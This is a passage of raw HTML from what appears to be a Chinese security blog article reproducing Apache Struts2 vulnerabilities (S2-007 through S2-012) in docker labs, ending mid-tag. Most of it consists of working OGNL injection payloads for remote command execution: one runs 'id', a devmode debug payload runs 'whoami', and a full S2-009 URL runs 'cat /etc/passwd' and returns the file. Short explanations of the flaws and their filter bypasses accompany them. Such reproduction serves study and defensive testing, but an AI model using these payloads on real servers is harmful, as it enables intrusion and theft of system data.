style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/12_vgH4aI62pY6lic0SMEk5LDx00C5n9Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wKSDzphUxCc3Gas5eVmnrJBpkIvgH4aI62pY6lic0SMEk5LDx00C5n9Q/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">也可以直接在age文本框处使用payload</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExe cution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">id</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">').getInputStream())) + '</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6479690522243714" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/13_Kl5ZPDTJWxajRvvX4lzibDjVgloL8Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wC37Zj5lOBDYibgudib9c44u2TKNKl5ZPDTJWxajRvvX4lzibDjVgloL8Q/640?wx_fmt=png'" data-type="png" data-w="517" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">即可得到id</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6442477876106195" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/14_0FXNDNsXbqicnMa1Is3nWTOianQndw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wESGD751ohJSemoTTFHicria36x1l0FXNDNsXbqicnMa1Is3nWTOianQndw/640?wx_fmt=png'" data-type="png" data-w="565" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-008</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-008漏洞产生的原因，主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码，传入?debug=command&amp;expression=即可执行OGNL表达式</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-008的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5627376425855514" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/15_SobjAVFX3yfpY90oa1pyJJXlnLia7g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wice92B5NYx6XhlrDx99yKuhsAvSobjAVFX3yfpY90oa1pyJJXlnLia7g/640?wx_fmt=png'" data-type="png" data-w="1052" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在GET包处添加payload执行whoami</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">devmode</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">action</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">command</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">expression</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext@DEFAULT_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23parameters</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">rpsobj</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]].</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">println</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23parameters</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">command</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))):</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xx</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">json</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">rpsobj</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dispatcher</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">HttpServletResponse</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">content</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">123456789</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">command</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoami</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/16_LicdibicszXmt9CSsnavyHYeUakWag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wcU1ibXQnZJFW3SJM6u5re58j4l8bLicdibicszXmt9CSsnavyHYeUakWag/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-009</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)('xxx')=1</code>的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">影响版本Struts 2.1.0-2.3.1.1</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入S2-009的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5638095238095238" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/17_8Gxf0Ud1JPRTJeZwxt6g9sDwoN3ILQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wAL1DoibcZiasS8nSib82XfePBDr8Gxf0Ud1JPRTJeZwxt6g9sDwoN3ILQ/640?wx_fmt=png'" data-type="png" data-w="1050" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">访问<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">192.168.1.8:8080/ajax/example5</code>，此为存在漏洞的界面</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.781733746130031" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/18_XgSzyHzGcsDCjXCnPMmFibfcrrulZg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wibmQf4N9X1mVIjrHUpGU1lsUUKXgSzyHzGcsDCjXCnPMmFibfcrrulZg/640?wx_fmt=png'" data-type="png" data-w="646" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">将payload拼接读取passwd文件</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec("cat /etc/passwd").getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4281742354031511" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/19_9Bicebr4K3bAkR6L3879DxoNCKyFUw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wqyBmHXMX8ZJd7xQe9k4Hv30icib9Bicebr4K3bAkR6L3879DxoNCKyFUw/640?wx_fmt=png'" data-type="png" data-w="1079" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-012</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><section class="code-snippet__github" style="margin: 